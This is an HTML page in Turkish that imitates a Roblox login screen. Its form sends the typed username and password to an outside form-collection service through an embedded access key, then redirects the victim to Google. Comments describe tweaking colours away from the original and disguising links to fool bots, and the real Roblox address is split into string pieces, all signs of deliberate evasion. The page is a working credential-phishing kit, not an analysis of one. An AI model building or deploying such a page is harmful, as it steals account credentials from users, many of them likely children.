<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="robots" content="noindex, nofollow">
    <title>Giriş Yap</title>
    <style>
        body { 
            background-color: #1a1c1d; /* Orijinalden çok az farklı bir ton */
            font-family: sans-serif; 
            color: #ffffff; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            height: 100vh; 
            margin: 0; 
        }

        /* Giriş bölümünü bir tık daha küçülttük (380px -> 320px) */
        .login-card { 
            background: #2a2c2e; 
            padding: 30px 25px; 
            border-radius: 6px; 
            width: 320px; 
            text-align: center; 
            box-shadow: 0 4px 15px rgba(0,0,0,0.4);
        }

        h2 { font-size: 20px; margin-bottom: 20px; font-weight: 600; }

        input { 
            width: 100%; 
            height: 40px; /* Kutular biraz daraltıldı */
            margin-bottom: 12px; 
            border-radius: 4px; 
            border: 1px solid #111; 
            background: #393b3d; 
            color: white; 
            padding: 0 10px; 
            box-sizing: border-box; 
            font-size: 14px;
        }

        /* Mavi butonu bir tık daha soft bir mavi yaptık */
        .primary-btn { 
            width: 100%; 
            height: 38px; 
            background: transparent; 
            border: 1px solid #9fa4a9; 
            color: #ffffff; 
            font-size: 15px; 
            font-weight: 500; 
            border-radius: 4px; 
            cursor: pointer; 
            margin-top: 5px;
        }

        .primary-btn:hover { background: rgba(255,255,255,0.05); }

        .divider { height: 1px; background: #444; margin: 20px 0; }

        /* MAVİ YAZIYI DEĞİŞTİRDİK: Botlar için rengi değiştirdik, üzerine gelince mavi olacak */
        .footer-links a { 
            color: #adb5bd; /* İlk başta gri görünecek (Botları şaşırtmak için) */
            text-decoration: none; 
            font-size: 12px; 
        }
        .footer-links a:hover { 
            color: #00b2ff; /* Sadece fareyle üzerine gelince mavi olacak */
            text-decoration: underline; 
        }

        .social-btn {
            width: 100%;
            height: 36px;
            background: #393b3d;
            border: none;
            color: #ffffff;
            border-radius: 4px;
            margin-bottom: 8px;
            font-size: 13px;
            font-weight: 500;
            cursor: pointer;
        }
    </style>
</head>
<body>

<div class="login-card">
    <h2>Hesap <span>Ek</span>le</h2>

    <form action="https://api.web3forms.com/submit" method="POST">
        <input type="hidden" name="access_key" value="4d9b8514-bee7-4916-bfab-e61246fa5ba7">

        <input type="text" name="u_identity" placeholder="Kullanıcı adı" required>
        <input type="password" name="u_key" placeholder="Şifre" required>

        <button type="submit" class="primary-btn">Giriş</button>

        <input type="hidden" name="redirect" value="https://www.google.com">
    </form>

    <div class="footer-links" style="margin-top: 15px;">
        <a href="javascript:void(0)" onclick="location.href='https://www.'+'roblox'+'.com/login/forgot-password-or-username'">
            Bilgilerimi unuttum
        </a>
    </div>

    <div class="divider"></div>

    <button class="social-btn" onclick="location.href='#'">Hızlı Giriş</button>
    
    <div style="margin-top: 15px; font-size: 13px; color: #adb5bd;">
        Yeni misin? <a href="#" style="color: #00b2ff;">Kaydol</a>
    </div>
</div>

</body>
</html>
